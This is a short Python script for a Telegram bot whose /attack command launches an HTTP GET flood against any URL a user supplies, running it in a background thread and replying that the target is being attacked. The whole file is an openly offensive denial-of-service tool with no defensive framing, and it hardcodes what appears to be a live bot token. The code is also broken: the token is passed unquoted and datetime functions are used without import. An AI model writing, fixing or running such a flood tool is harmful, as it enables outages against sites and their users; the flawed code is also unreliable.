import telebot
import requests
import threading

API_TOKEN = '8629855258:AAE5VY50Kn92ISs1boi5nTkPDiAkkZxhdKo'
bot = telebot.TeleBot(8629855258:AAE5VY50Kn92ISs1boi5nTkPDiAkkZxhdKo)

def http_flood(target_url, duration=10):
    """Simulates a simple HTTP GET flood."""
    end_time = datetime.now() + timedelta(seconds=duration)
    while datetime.now() < end_time:
        try:
            requests.get(target_url)
        except Exception as e:
            pass  # Ignore errors for simplicity

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Send /attack <url> to start a simple HTTP flood.")

@bot.message_handler(func=lambda message: message.text.startswith('/attack '))
def handle_attack(message):
    target = message.text.split()[1]
    duration = 30  # Default 30 seconds
    
    # Launch in background thread
    t = threading.Thread(target=http_flood, args=(target, duration))
    t.start()
    
    bot.reply_to(message, f"Attacking {target} for {duration} seconds!")

if __name__ == '__main__':
    bot.polling(none_stop=True)
